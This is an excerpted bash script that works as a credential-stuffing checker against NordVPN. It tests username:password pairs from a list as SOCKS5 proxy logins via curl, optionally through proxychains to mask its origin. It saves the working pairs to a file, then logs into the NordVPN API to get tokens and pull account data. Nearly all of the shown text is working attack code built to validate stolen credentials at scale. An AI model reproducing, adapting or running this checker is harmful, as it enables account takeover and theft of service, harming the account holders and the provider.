...
proxychains="true" ##This value for using proxychains or not [true|false]
proxychains_info="true" ##This value for using proxychains or not for getting account info [true|false]
kill="true" ## using timeout
hostchk="ifconfig.co"
ver=2.1
fn=$1
out="work.txt"
...
#      echo We sleep $slp sec. Current proc running `ps|grep curl|wc -l` Limit : $threads
  ...
  if [ "$proxychains" == "true" ]; then
	if [ "$kill" == "true" ]; then
  		(timeout $tmo proxychains curl --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
#  		(timeout $tmo proxychains curl --retry 2 --retry-delay 1 --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
	else
#  		(proxychains curl --retry 2 --retry-delay 1 --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
  		(proxychains curl --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
	fi
  else
	if [ "$kill" == "true" ]; then
	  	(timeout $tmo curl --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
#	  	(timeout $tmo curl --retry 2 --retry-delay 1 --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
	else
	  	(timeout $tmo curl --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
#	  	(timeout $tmo curl --retry 2 --retry-delay 1 --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 $hostchk >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
	fi
...
while [ true ]; do
  ...
  then 
	...
	if [ "$proxychains_info" == "true" ]; then
		...
		s=$(curl -s --header "Content-Type: application/json"  --request POST   --data "{\"username\": \"${Array[0]}\", \"password\": \"${Array[1]}\"}"  https://api.nordvpn.com/v1/users/tokens)
	fi
        ([[ $s =~ "Unauthorized" ]] && [[ $s =~ "Invalid username" ]]) || (t=$(echo $s| awk -F "\"" '{print $6}'|tr -d "\n")
        printf "\nchecking ${Array[0]}:${Array[1]}:token=$t"
	if [ "$proxychains_info" == "true" ]; then
        	user_json=$(proxychains curl --connect-timeout $tmo -m $tmo --retry 2 --silent -X GET --header "nToken: $t" --header "Accept: application/json" https://api.nordvpn.com/user/databytoken)
	else
	        user_json=$(curl --connect-timeout $tmo -m $tmo --retry 2 --silent -X GET --header "nToken: $t" --header "Accept: application/json" https://api.nordvpn.com/user/databytoken)
	fi
#        user_json=$(curl --connect-timeout $tmo -m $tmo --retry 2 --retry-delay 1 --retry-max-time 5 --silent -X GET --header "nToken: $t" --header "Accept: application/json" https://api.nordvpn.com/user/databytoken)
